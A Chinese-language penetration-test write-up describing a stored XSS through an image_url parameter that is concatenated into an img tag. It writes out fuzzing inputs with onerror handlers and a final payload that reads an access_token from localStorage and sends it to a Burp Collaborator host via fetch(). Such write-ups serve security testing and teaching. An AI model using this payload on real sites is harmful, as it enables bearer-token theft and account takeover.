## **前言**
前不久分享了一篇文章,从PDF中获取数据,以求最大化的利用XSS漏洞。一般情况下利用XSS漏洞都是为了尽可能的获取管理员的COOKIE信息,但有的时候后台凭证数据不一定只存在于COOKIE中,存在客户端本地的例子也是有的。如下图，这是某次授权的测试中发现的，直接把用户名密码的明文信息存储在了本地  
## **触发XSS漏洞**
这是一个文件上传的功能,上传文件的时候会把文件上传到云存储上,然后会回传一个url链接给服务器，服务器通过参数image_url来接收url链接,然后拼接到img标签中  
返回的img标签和"s1600"字符串相连接  
我们的目标也很简单,就是要触发存储XSS漏洞，毕竟这是一切的基础。给image_url参数传了一个非URL值,没问题进行了拼接。仔细观察拼接到img标签中的数据，不仅字符串被拼接到了img标签中，而且还多出了空格。  
接下来对image_url参数进行fuzz  
(1) image_url="xxx test"，HTML中的返回为
    ;
(2) image_url="xxx onerror=test"，HTML中的返回为 ;  
(3) image_url="xxx onerror=alert(document.cookie);"，HTML中的返回为  
感觉这次有戏了,验证一下,弹窗了，离成功又进了一步  
## **读取本地存储信息**
本地存储是一种Web存储API，浏览器使用它来存储键/值对。它为每个域（来源）维护一个单独的存储区域。 即使关闭浏览器，数据仍保留在本地存储中。
可以通过Window.localStorage对象访问  
通过burpsuite抓包分析,该应用程序还在基于cookie的身份验证之上使用Bearer Token。
该应用程序将Token的原始值以JSON格式存储在本地存储中。接下来我们看下如何通过XSS漏洞获取到本地存储中的Token值  
我们可以通过javascript读取本地存储,要检索密钥,可以使用getItem()  
    localStorage.getItem('Key')，读取信息
    可以使用JSON.parse解析JSON值，json.parse(localStorage.getItem('Key')).KEYNAME
接下来构造payload  
(1)首先从本地存储中检索access_token
    token=JSON.parse(localStorage.getItem('KEYNAME')).access_token
(2) 将Token通过burpsuite进行带外
    url=https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator. net/'token
(3) 最终payload如下:
    "xxx
    onerror=token=JSON.parse(localStorage.getItem('KEYNAME')).access_token,url=https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator.net/'+token,fetch(url);"
在HTML中返回为
在BurpSuite中可以看到通过带外获取到的Token值